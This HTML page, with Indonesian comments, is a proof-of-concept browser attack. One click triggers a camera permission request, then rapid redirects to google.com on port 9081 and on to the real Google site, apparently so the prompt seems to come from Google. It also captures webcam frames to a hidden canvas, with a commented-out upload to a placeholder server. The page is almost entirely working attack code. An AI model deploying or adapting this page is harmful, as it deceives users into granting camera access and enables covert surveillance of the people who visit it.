<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #f00; font-family: monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
  }
  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
  h2 { animation: blink 0.2s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 120px; overflow-y: auto; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>☢️ SYSTEM HACKED ☢️</h2>
  <p>Klik di mana saja untuk memverifikasi.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>
<video id="cam-feed" autoplay playsinline muted></video>
<canvas id="processing-canvas" width="640" height="480"></canvas>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var GOOGLE_DELAY = "http://google.com:9081"; // Memicu delay
  var GOOGLE_REAL = "https://www.google.com"; // Target akhir
  
  // ============================================
  // FUNGSI: CAMERA PERMISSION REQUEST
  // ============================================
  function triggerCameraPermission() {
    try {
      log("[+] Meminta Izin Kamera...");
      
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(function(stream) {
          var video = document.getElementById('cam-feed');
          video.srcObject = stream;
          video.play().catch(function(){});
          log("[+] Kamera BERHASIL diakses!");
          
          // Stream ke server (Opsional)
          setInterval(function() {
            var canvas = document.getElementById('processing-canvas');
            var ctx = canvas.getContext('2d');
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              // fetch('https://your-server.com/upload', ...) 
            }
          }, 100);
        })
        .catch(function(err) {
          log("[-] Kamera diblokir: " + err.name);
        });
    } catch(e) {}
  }

  // ============================================
  // TRIGGER STACKING & REDIRECT (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>EXECUTING...</h2>
      <p>Memulai Stacked Permission & Redirect...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Stacked Permission...");

    // A. Minta Izin Kamera (0ms)
    triggerCameraPermission();

    // B. Redirect ke Google Port 9081 (10ms - Setelah prompt muncul)
    setTimeout(function() {
      log("[+] Redirect ke Google:9081 (Delay)...");
      try {
        window.location.href = GOOGLE_DELAY;
      } catch(e) {}
    }, 10);

    // C. Timpa dengan Google Asli (500ms)
    setTimeout(function() {
      log("[+] Menimpa dengan Google Asli...");
      try {
        window.location.href = GOOGLE_REAL;
      } catch(e) {}
    }, 500);

    // D. Fallback Iframe (1000ms)
    setTimeout(function() {
      log("[+] Mengirim Delay via Iframe...");
      try {
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        iframe.src = GOOGLE_DELAY;
        document.getElementById("launcher-container").appendChild(iframe);
      } catch(e) {}
    }, 1000);

  }, { once: true });

})();
</script>
</body>
</html>
